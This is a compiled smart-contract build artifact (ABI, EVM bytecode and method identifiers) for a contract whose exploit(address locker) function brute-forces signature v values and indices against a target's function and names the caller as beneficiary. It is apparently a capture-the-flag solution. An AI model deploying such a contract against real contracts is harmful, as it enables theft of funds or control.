{"abi":[{"type":"function","name":"exploit","inputs":[{"name":"locker","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"testEncoding","inputs":[{"name":"r","type":"uint256","internalType":"uint256"},{"name":"s","type":"uint256","internalType":"uint256"},{"name":"v","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bytes32","internalType":"bytes32"}],"stateMutability":"pure"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506102968061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80630aeb4ddf14610038578063b7edd2241461004d575b5f5ffd5b61004b61004636600461018a565b610072565b005b61006061005b3660046101c4565b61013f565b60405190815260200160405180910390f35b601b5b601c8160ff161161013b575f5b600a811015610128576040517f3e8cd57000000000000000000000000000000000000000000000000000000000815260ff83166004820152602481018290525f604482015233606482015273ffffffffffffffffffffffffffffffffffffffff841690633e8cd570906084015f604051808303815f87803b158015610105575f5ffd5b505af1925050508015610116575060015b1561012057505050565b600101610082565b5080610133816101ed565b915050610075565b5050565b60408051606081018252848152602080820185905281830184905291515f9261016a91839101610230565b604051602081830303815290604052805190602001209150509392505050565b5f6020828403121561019a575f5ffd5b813573ffffffffffffffffffffffffffffffffffffffff811681146101bd575f5ffd5b9392505050565b5f5f5f606084860312156101d6575f5ffd5b505081359360208301359350604090920135919050565b5f60ff821660ff8103610227577f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b60010192915050565b6060810181835f5b6003811015610257578151835260209283019290910190600101610238565b5050509291505056fea2646970667358221220e1d265fdd17a400e4609635c11c981bf9d7d2c478109301c927a08a05557ea7a64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploit(address)":"0aeb4ddf","testEncoding(uint256,uint256,uint256)":"b7edd224"},"id":0}